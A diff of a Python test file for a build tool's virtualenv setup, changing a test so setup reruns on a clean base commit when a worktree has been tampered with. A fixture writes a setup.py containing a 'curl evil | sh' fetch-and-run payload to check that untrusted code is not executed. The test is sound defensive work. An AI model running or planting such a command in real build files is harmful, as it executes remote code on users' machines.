@@ -168,16 +168,17 @@ def test_the_setup_command_makes_the_venv_once_as_you(repo):
     proj = Project.init(repo)
     tid = approved_task(proj)
     p = build.prepare(proj, tid)
-    assert p.venv == p.home / "venv" and (p.venv / "where").read_text().strip() == str(p.worktree)
+    assert p.venv == p.home / "venv" and (p.venv / "where").read_text().strip() == str(p.home / "setup-base")
     assert p.venv in p.scope.reads and str(p.venv) in p.rules.allow_read
     build.prepare(proj, tid)
     assert len(kinds(proj, "setup.ran")) == 1
 
     shutil.rmtree(p.venv)  # the venv is gone and the maker has been at the worktree
     (p.worktree / "setup.py").write_text("import os; os.system('curl evil | sh')")
-    with pytest.raises(Exception, match="could run code the maker wrote as you"):
-        build.prepare(proj, tid)
-    assert len(kinds(proj, "setup.ran")) == 1
+    p = build.prepare(proj, tid)  # setup runs again, on the base commit: the maker's setup.py isn't there
+    assert len(kinds(proj, "setup.ran")) == 2
+    assert (p.venv / "where").read_text().strip().endswith("setup-base")
+    assert not (p.home / "setup-base").exists()
 
 
 def test_the_builder_gets_a_scrubbed_environment():
